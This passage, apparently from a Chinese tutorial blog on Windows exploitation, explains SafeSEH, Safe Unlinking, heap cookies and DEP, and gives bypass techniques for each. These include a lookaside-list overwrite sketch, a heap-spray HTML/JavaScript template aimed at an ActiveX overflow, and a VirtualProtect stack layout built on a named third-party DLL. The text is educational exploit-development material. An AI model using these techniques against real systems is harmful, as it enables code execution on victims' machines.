&lt;h4 id=&quot;2-利用SafeSEH保护模块之外的地址&quot;&gt;&lt;a href=&quot;#2-利用SafeSEH保护模块之外的地址&quot; class=&quot;headerlink&quot; title=&quot;2.利用SafeSEH保护模块之外的地址&quot;&gt;&lt;/a&gt;2.利用SafeSEH保护模块之外的地址&lt;/h4&gt;&lt;p&gt;对于目前的大部分windows操作系统，其系统模块都受SafeSEH保护，可以选用未开启SafeSEH保护的模块来利用，比如漏洞软件本身自带的dll文件，这个可以借助OD插件SafeSEH来查看进程中各模块是否开启SafeSEH保护。除此之外，也可通过直接覆盖返回地址(jmp/call esp)来利用。另一种方法，如果esp +8 指向EXCEPTION_REGISTRATION 结构，那么你仍然可以寻找一个pop/pop/ret指令组合（在加载模块的地址范围之外的空间），也可以正常工作。但如果你在程序的加载模块中找不到pop/pop/ret 指令，你可以观察下esp/ebp,查看下这些寄存器距离nseh 的偏移，接下来就是查找这样的指令：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;call dword ptr[esp+nn] / jmp dword ptr[esp+nn]                                                                        &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;call dword ptr[ebp+nn] / jmp dword ptr[ebp+nn] &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;call dword ptr[ebp-nn] / jmp dword ptr[ebp-nn]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;(其中的nn 就是寄存器的值到nseh 的偏移，偏移nn可能是: esp+8, esp+14, esp+1c, esp+2c, esp+44, esp+50, ebp+0c, ebp+24, ebp+30, ebp-04, ebp-0c, ebp-18)。&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;如果遇到以上指令是以NULL字节结尾的，可将shellcode放置在SEH之前：&lt;br&gt;• 在nseh 上放置向后的跳转指令（跳转7 字节：jmp 0xfffffff9）；&lt;br&gt;• 向后跳转足够长的地址以存放shellcode，并借此执行至shellcode；&lt;br&gt;• 把shellcode 放在用于覆盖异常处理结构的指令地址之前。&lt;/p&gt;
&lt;h2 id=&quot;三、Safe-Unlinking&quot;&gt;&lt;a href=&quot;#三、Safe-Unlinking&quot; class=&quot;headerlink&quot; title=&quot;三、Safe Unlinking&quot;&gt;&lt;/a&gt;三、Safe Unlinking&lt;/h2&gt;&lt;h3 id=&quot;原理-2&quot;&gt;&lt;a href=&quot;#原理-2&quot; class=&quot;headerlink&quot; title=&quot;原理&quot;&gt;&lt;/a&gt;原理&lt;/h3&gt;&lt;p&gt;在Windows XP SP2之后，堆分配器在从空闲链表中移除堆块时使用safe unlinking进行保护，防止堆溢出被利用。在使用flink和blink指针前，它会验证是否满足以下条件：Entry-&amp;gt;Flink-&amp;gt;Blink == Entry-&amp;gt;Blink-&amp;gt;Flink == Entry，以防止攻击者使flink或blink指向任意内存地址，进而消除在执行unlink操作时写入任意4字节数据的机会。&lt;/p&gt;
&lt;h3 id=&quot;绕过方法：-1&quot;&gt;&lt;a href=&quot;#绕过方法：-1&quot; class=&quot;headerlink&quot; title=&quot;绕过方法：&quot;&gt;&lt;/a&gt;绕过方法：&lt;/h3&gt;&lt;h4 id=&quot;1-利用旁视列表（lookaside-list）&quot;&gt;&lt;a href=&quot;#1-利用旁视列表（lookaside-list）&quot; class=&quot;headerlink&quot; title=&quot;1.利用旁视列表（lookaside list）&quot;&gt;&lt;/a&gt;1.利用旁视列表（lookaside list）&lt;/h4&gt;&lt;p&gt;旁视列表（《软件调试》），也叫快表（《0day安全：软件漏洞分析技术》），它是一张链表，共包含128 项，每一项对应于一个单向链表。每个单向链表都包含了一组固定大小的空闲块，堆块的大小从16 字节开始随索引递增依次增加8字节。最后一个索引（127）包含了大小为1024 字节的空闲堆块。每个堆块包含了8 个字节的块首，用于管理这个堆块。返回给调用者的最小堆块是16 字节。这样，旁视列表前端分配器没有使用索引为0的项，因为这个项对应于大小为8 个字节的空闲堆块。由于在safe unlinking过程中，快表被忽略了，当在快表中分配一块空闲块后，若将该空闲块从链表中移除，则该块的flink指针会写入块首，而系统并未对flink指针的有效性进行验证，这样就导致在分配下一个同大小的堆块时，它将会把flink指针返回给新分配的块。如果攻击者能够覆盖快表中的链表头，那么就可以用任意地址来替换flink指针，并在分配新块时写入任意字节，最后返回被我们修改的地址的值。这一攻击方式最早是由Matt Conover在CanSecWest 2004黑客大会上公布的&lt;a href=&quot;http://cybertech.net/~sh0ksh0k/projects/winheap/XPSP2%20Heap%20Exploitation.ppt&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;《Windows Heap ExploitationWin2KSP0 through WinXPSP2)》&lt;/a&gt;&lt;br&gt;实现步骤如下：&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;p = HeapAlloc(n);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;FillLookaside(n);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;HeapFree(p);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;EmptyLookaside(n);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;利用以下值篡改 p[0]（任一堆地址）:&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;p-&amp;gt;Flags = Busy (防止偶然发生堆块合并)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;p -&amp;gt;Flink = (BYTE *)&amp;amp;ListHead[(n/&lt;span class=&quot;number&quot;&gt;8&lt;/span&gt;)+&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;] - &lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;p -&amp;gt;Blink = (BYTE *)&amp;amp;ListHead[(n/&lt;span class=&quot;number&quot;&gt;8&lt;/span&gt;)+&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;] + &lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;HeapAlloc(n); &lt;span class=&quot;comment&quot;&gt;// 破坏 safe unlinking &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;p = HeapAlloc(n); &lt;span class=&quot;comment&quot;&gt;// 破坏 safe unlinking&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// 现在p指向 &amp;amp;ListHead[(n/8)].Blink&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;但在Windows Vista之后，快表被低碎片堆（Low-Fragmentation Heap）所代替了，上面的攻击方式就不再适用了。&lt;/p&gt;
&lt;h4 id=&quot;2-heap-spary&quot;&gt;&lt;a href=&quot;#2-heap-spary&quot; class=&quot;headerlink&quot; title=&quot;2.heap spary&quot;&gt;&lt;/a&gt;2.heap spary&lt;/h4&gt;&lt;p&gt;Heap Spary技术最早是由SkyLined于2004年为IE的iframe漏洞写的exploit而使用到新技术，目前主要作为浏览器攻击的经典方法，被大量网马所使用。Heap Spary技术是使用js分配内存，所分配的内存均放入堆中，然后用各带有shellcode的堆块去覆盖一大片内存地址，Javascript分配内存从低址向高址分配，申请的内存空间超出了200M，即大于了0x0C0C0C0C时，0x0C0C0C0C就会被覆盖掉，因此只要让IE执行到0x0C0C0C0C（有时也会用0x0D0D0D0D这一地址）就可以执行shellcode，这些堆块可以用NOP + shellcode 来填充，每块堆构造1M大小即可，当然这也不是固定。这样当nop区域命中0x0c0c0c0c时，就可执行在其后面的shellcode。下面是一个简单模板：&lt;/p&gt;
&lt;figure class=&quot;highlight js&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;object classid=&quot;clsid:6BE52E1D-E586-474F-A6E2-1A85A9B4D9FB&quot; id=&quot;target&quot;&amp;gt;&amp;lt;/object&amp;gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Var shellcode=&quot;\u68fc\u7473\u6668\u6961……\u53c4\u5050\uff53\ufc57\uff53\uf857&quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;var nop=&quot;\u9090\u9090&quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;while (nop.length &amp;lt;= 0x100000/2)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        nop+=nop;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;nop = nop.substring(0,0x100000/2-32/2-4/2-shellcode.length-2/2);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;var slide = new Array();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;for ( var i=0; i&amp;lt;200; i++)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        slide[i] = nop + shellcode;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;var s= &#39;&#39;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;while (s.length &amp;lt; 748)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        s+=&quot;\x0c&quot;; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;target.Overflow(s);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;四、Heap-Cookie及其加密&quot;&gt;&lt;a href=&quot;#四、Heap-Cookie及其加密&quot; class=&quot;headerlink&quot; title=&quot;四、Heap Cookie及其加密&quot;&gt;&lt;/a&gt;四、Heap Cookie及其加密&lt;/h2&gt;&lt;h3 id=&quot;原理-3&quot;&gt;&lt;a href=&quot;#原理-3&quot; class=&quot;headerlink&quot; title=&quot;原理&quot;&gt;&lt;/a&gt;原理&lt;/h3&gt;&lt;p&gt;在heap header中加入cookie值，原理与栈中的cookie类似，用于检测堆溢出的发生，cookie被放置在堆首部分原堆块的segment table的位置，占1字节大小，其计算公式如下：&lt;/p&gt;
&lt;figure class=&quot;highlight c++&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;(AddressOfChunkHeader / &lt;span class=&quot;number&quot;&gt;8&lt;/span&gt;) XOR Heap-&amp;gt;Cookie = Cookie&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;即堆块头部地址除以8，然后跟Heap管理结构中的cookie相异或就得到了cookie值。&lt;/p&gt;
&lt;h3 id=&quot;绕过方法-1&quot;&gt;&lt;a href=&quot;#绕过方法-1&quot; class=&quot;headerlink&quot; title=&quot;绕过方法&quot;&gt;&lt;/a&gt;绕过方法&lt;/h3&gt;&lt;h4 id=&quot;1-猜测-计算cookie-1&quot;&gt;&lt;a href=&quot;#1-猜测-计算cookie-1&quot; class=&quot;headerlink&quot; title=&quot;1.猜测/计算cookie&quot;&gt;&lt;/a&gt;1.猜测/计算cookie&lt;/h4&gt;&lt;p&gt;由于cookie只有1字节，因此共有256种可能存在的值，如果通过暴力猜测的话，也是存在被破解的可能。&lt;/p&gt;
&lt;h4 id=&quot;2-heap-spary-1&quot;&gt;&lt;a href=&quot;#2-heap-spary-1&quot; class=&quot;headerlink&quot; title=&quot;2.heap spary&quot;&gt;&lt;/a&gt;2.heap spary&lt;/h4&gt;&lt;p&gt;具体利用方法同上，这里不再赘述。&lt;/p&gt;
&lt;h2 id=&quot;三、DEP&quot;&gt;&lt;a href=&quot;#三、DEP&quot; class=&quot;headerlink&quot; title=&quot;三、DEP&quot;&gt;&lt;/a&gt;三、DEP&lt;/h2&gt;&lt;h3 id=&quot;原理-4&quot;&gt;&lt;a href=&quot;#原理-4&quot; class=&quot;headerlink&quot; title=&quot;原理&quot;&gt;&lt;/a&gt;原理&lt;/h3&gt;&lt;p&gt;数据执行保护 (DEP) 是一套软硬件技术，能够在内存上执行额外检查以防止在不可运行的内存区域上执行代码。在 Microsoft Windows XP Service Pack 2、 Microsoft Windows Server 2003 Service Pack 1 、Microsoft Windows XP Tablet PC Edition 2005 、Microsoft Windows Vista 和 windows 7 中，由硬件和软件一起强制实施 DEP。DEP 有两种模式，如果CPU 支持内存页NX 属性， 就是硬件支持的DEP。只有当处理器/系统支持NX/XD位（禁止执行）时，windows才能拥有硬件DEP，否则只能支持软件DEP，相当于只有SafeSEH保护。&lt;/p&gt;
&lt;h3 id=&quot;绕过方法：-2&quot;&gt;&lt;a href=&quot;#绕过方法：-2&quot; class=&quot;headerlink&quot; title=&quot;绕过方法：&quot;&gt;&lt;/a&gt;绕过方法：&lt;/h3&gt;&lt;h4 id=&quot;1-ret2lib&quot;&gt;&lt;a href=&quot;#1-ret2lib&quot; class=&quot;headerlink&quot; title=&quot;1.ret2lib&quot;&gt;&lt;/a&gt;1.ret2lib&lt;/h4&gt;&lt;p&gt;其思路为：将返回地址指向lib库中的代码，而不直接跳转到shellcode 去执行，进而实现恶意代码的运行。可以在库中找到一段执行系统命令的代码，比如system()函数，用它的地址覆盖返回地址，此时即使NX/XD 禁止在堆栈上执行代码，但库中的代码依然是可以执行的。函数system()可通过运行环境来执行其它程序，例如启动Shell等等。另外，还可以通过VirtualProtect函数来修改恶意代码所在内存页面的执行权限，然后再将控制转移到恶意代码，其堆栈布局如下所示：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;┏━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━┓      &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;┃                        ┃            恶意代码              ┃内存高地址&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;┃                        ┣━━━━━━━━━━━━━━━━━┫┃&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;┃                        ┃        lpflOldProtect            ┃┃&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;┃                        ┣━━━━━━━━━━━━━━━━━┫┃&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;┃                        ┃          flNewProtect            ┃┃栈&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;┃       调用参数         ┣━━━━━━━━━━━━━━━━━┫┃&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;┃                        ┃             dwSize               ┃┃生&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;┃                        ┣━━━━━━━━━━━━━━━━━┫┃&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;┃                        ┃            lpAddress             ┃┃长&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;┃                        ┣━━━━━━━━━━━━━━━━━┫┃&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;┃                        ┃      恶意代码的入口地址          ┃┃方&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;┣━━━━━━━━━━━━╋━━━━━━━━━━━━━━━━━┫┃&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;┃      返回地址          ┃    VirtualProtect函数地址        ┃┃向&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;┣━━━━━━━━━━━━╋━━━━━━━━━━━━━━━━━┫┃&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;┃ EBP上层函数堆栈基址   ┃                                  ┃┃&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;┣━━━━━━━━━━━━┫                                  ┃┃&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;┃ 异常例程入口地址（若有 ┃　    填充数据的覆盖区域          ┃┃&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;┃设置的话,比如try…catch)┃       （AAAAAAAA……）           ┃┃&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;┣━━━━━━━━━━━━┫                                  ┃▼&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;┃      局部变量          ┃                                  ┃内存低地址&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;┗━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━━┛&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;由于后期系统dll加入了ASDL保护，因此我们可以选用未开启ASLR的第三方DLL文件，示例如下（这里使用迅雷IE插件）：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;XunleiBHO7.1.6.2194.dll(DEP/ NO ASLR)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;.text:211D18F5                 call    ds:VirtualProtect&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;.text:211D18FB                 pop     esi&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;.text:211D18FC                 pop     ebp&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;.text:211D18FD                 retn    0Ch&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;栈空间布局：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;41414141  垃圾字节（共3088字节）&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;……&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;211D18F5  返回地址&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;41414141  平衡堆栈（视漏洞函数的具体情况而定）&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;07c50000  lpAddress(shellcode地址)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;00001000  dwSize&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;00000040  flNewProtect (PAGE_EXECUTE_READWRITE)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;07c50020  lpflOldProtect (可写地址)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;41414141  平衡 pop esi 使用的堆栈&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;41414141  平衡 pop ebp 使用的堆栈&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;07c50000  返回地址，指向shellcode&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;在一次实际利用中，我使用了COMODO主动防御软件中的guard32.dll来定位VirtualProtect函数：&lt;/p&gt;
